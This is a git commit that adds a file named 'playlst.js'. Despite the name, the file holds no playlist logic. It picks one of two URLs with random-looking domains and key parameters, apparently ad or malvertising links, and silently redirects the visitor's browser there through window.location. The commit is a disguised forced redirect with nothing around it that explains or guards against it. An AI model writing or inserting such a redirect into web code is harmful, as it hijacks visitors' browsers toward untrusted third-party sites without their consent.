77a934ffccf57dd460ae08fa112ef4719f88e2d8
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-11-04 12:47:30 +0800

    Create playlst.js

---
+++ playlst.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'https://wavermerchandiseweird.com/a8bdifyf?key=48e6c2ef69984c23a22ba95e4592b445',
+'https://goshbiopsy.com/dvht8izcgt?key=8aa21e6e59d2d02685c3f44094cdbcac'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
